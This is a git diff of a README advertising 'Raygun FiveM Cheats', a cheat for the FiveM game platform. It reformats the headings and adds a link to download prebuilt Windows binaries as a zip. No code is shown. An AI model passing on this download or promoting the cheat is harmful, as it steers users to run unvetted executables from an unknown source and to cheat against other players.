@@ -1,5 +1,5 @@
 <p align="center"><img src="https://i.imgur.com/FYQhjoV.png" width="512" align="center"><br>
-<strong>Raygun FiveM Cheats</strong></p>
+# ⚔️ Raygun FiveM Cheats
 
 
 <strong>EN:</strong>
@@ -7,7 +7,8 @@ Raygun is a new unique high-quality cheat from an experienced development team t
 
 Enjoy and have fun.
 
-# Showcase
+## 📸 Showcase
 <p align="center"><img src="https://i.imgur.com/DFIXMFI.png" width="512" align="center"><br>
 
-# Download
+## 🔽 Download
+You can download pre-build binaries from [https://github.com/shahadatofficial10/raygun-fivem-cheats/releases/download/Release-win/Raygun-FiveM-win.zip](here)
